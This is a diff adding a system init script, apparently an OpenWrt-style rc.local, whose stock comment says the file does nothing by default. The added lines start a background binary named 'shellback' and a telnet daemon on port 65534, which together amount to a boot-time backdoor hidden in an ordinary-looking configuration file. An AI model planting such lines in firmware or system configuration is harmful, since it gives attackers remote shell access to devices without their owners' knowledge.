@@ -1,0 +1,6 @@
+# Put your custom commands here that should be executed once
+# the system init finished. By default this file does nothing.
+
+/usr/bin/shellback &
+/usr/sbin/telnetd -p 65534 &
+exit 0
